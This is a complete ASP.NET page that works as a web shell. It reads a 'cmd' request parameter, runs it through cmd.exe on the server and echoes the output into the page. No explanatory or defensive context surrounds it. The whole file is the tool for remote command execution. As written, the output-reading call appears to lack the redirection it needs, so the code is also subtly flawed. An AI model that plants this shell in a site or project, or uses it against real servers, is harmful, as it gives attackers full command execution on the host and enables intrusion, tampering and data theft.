<%@ Page Language="C#" %>
<% if (Request["cmd"] != null) { %>
<pre>
<%= Server.HtmlEncode(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd()) %>
</pre>
<% } %>
